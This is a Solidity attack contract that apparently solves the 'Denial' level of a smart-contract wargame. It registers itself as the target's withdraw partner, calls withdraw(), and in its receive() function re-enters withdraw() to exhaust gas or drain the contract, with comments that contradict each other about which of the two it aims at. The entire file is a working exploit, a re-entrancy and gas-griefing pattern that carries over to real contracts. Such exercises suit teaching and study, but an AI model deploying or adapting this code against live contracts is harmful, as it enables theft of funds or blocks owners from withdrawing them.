pragma solidity ^0.8.0;

contract DenialAttack {
    address payable public immutable denialInstance;

    constructor(address _instance) {
        denialInstance = payable(_instance);
    }

    // Set as partner, then call withdraw()
    function attack() external {
        (bool success,) = denialInstance.call(abi.encodeWithSignature("setWithdrawPartner(address)", address(this)));
        require(success, "Partner set failed");
        (bool success2,) = denialInstance.call(abi.encodeWithSignature("withdraw()"));
        require(success2, "Initial withdraw failed");
    }

    // Consume all gas on call to prevent owner from receiving funds
    receive() external payable {
        // Re-enter withdraw to drain all funds
        (bool success,) = denialInstance.call(abi.encodeWithSignature("withdraw()"));
        // Do not check success - continue even if it fails
    }
}